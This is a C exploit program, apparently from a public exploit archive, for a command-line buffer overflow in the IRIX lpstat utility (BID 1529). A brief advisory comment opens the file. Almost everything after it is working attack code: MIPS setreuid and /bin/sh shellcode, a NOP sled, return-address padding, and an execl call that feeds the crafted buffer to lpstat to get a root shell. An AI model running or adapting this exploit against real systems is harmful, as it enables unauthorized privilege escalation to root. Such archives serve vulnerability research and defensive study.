/*
source: http://www.securityfocus.com/bid/1529/info

Certain versions of IRIX ship with a version of lpstat which is vulnerable to a buffer overflow attack. The program, lpstat, is used to check the status of the printer being used by the IRIX machine. The problem is in the command line parsing section of the code whereby a user can supply an overly long string and overflow the buffer resulting in a possible root compromise. 
*/

/*## copyright LAST STAGE OF DELIRIUM nov 1998 poland        *://lsd-pl.net/ #*/
/*## /bin/lpstat                                                             #*/

#define NOPNUM 468
#define ADRNUM 300
#define PCHNUM 300

char setreuidcode[]=
    "\x30\x0b\xff\xff"    /* andi    $t3,$zero,0xffff     */
    "\x24\x02\x04\x01"    /* li      $v0,1024+1           */
    "\x20\x42\xff\xff"    /* addi    $v0,$v0,-1           */
    "\x03\xff\xff\xcc"    /* syscall                      */
    "\x30\x44\xff\xff"    /* andi    $a0,$v0,0xffff       */
    "\x31\x65\xff\xff"    /* andi    $a1,$t3,0xffff       */
    "\x24\x02\x04\x64"    /* li      $v0,1124             */
    "\x03\xff\xff\xcc"    /* syscall                      */
;

char shellcode[]=
    "\x04\x10\xff\xff"    /* bltzal  $zero,<shellcode>    */
    "\x24\x02\x03\xf3"    /* li      $v0,1011             */
    "\x23\xff\x01\x14"    /* addi    $ra,$ra,276          */
    "\x23\xe4\xff\x08"    /* addi    $a0,$ra,-248         */
    "\x23\xe5\xff\x10"    /* addi    $a1,$ra,-240         */
    "\xaf\xe4\xff\x10"    /* sw      $a0,-240($ra)        */
    "\xaf\xe0\xff\x14"    /* sw      $zero,-236($ra)      */
    "\xa3\xe0\xff\x0f"    /* sb      $zero,-241($ra)      */
    "\x03\xff\xff\xcc"    /* syscall                      */
    "/bin/sh"
;

char jump[]=
    "\x03\xa0\x10\x25"    /* move    $v0,$sp              */
    "\x03\xe0\x00\x08"    /* jr      $ra                  */
;

char nop[]="\x24\x0f\x12\x34";

main(int argc,char **argv){
    char buffer[10000],adr[4],pch[4],*b;
    int i;

    printf("copyright LAST STAGE OF DELIRIUM nov 1998 poland  //lsd-pl.net/\n");
    printf("/bin/lpstat for irix 6.2 6.3 IP:17,19,20,21,22,32\n\n");

    *((unsigned long*)adr)=(*(unsigned long(*)())jump)()+8888+1364+140-15012;
    *((unsigned long*)pch)=(*(unsigned long(*)())jump)()+8888+140+544+32748;

    b=buffer;
    *b++=0xff;
    for(i=0;i<NOPNUM;i++) *b++=nop[i%4];
    for(i=0;i<strlen(setreuidcode);i++) *b++=setreuidcode[i];
    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
    for(i=0;i<ADRNUM;i++) *b++=adr[i%4];
    for(i=0;i<PCHNUM;i++) *b++=pch[i%4];
    *b=0;

    execl("/bin/lpstat","lsd","-n",buffer,0);
}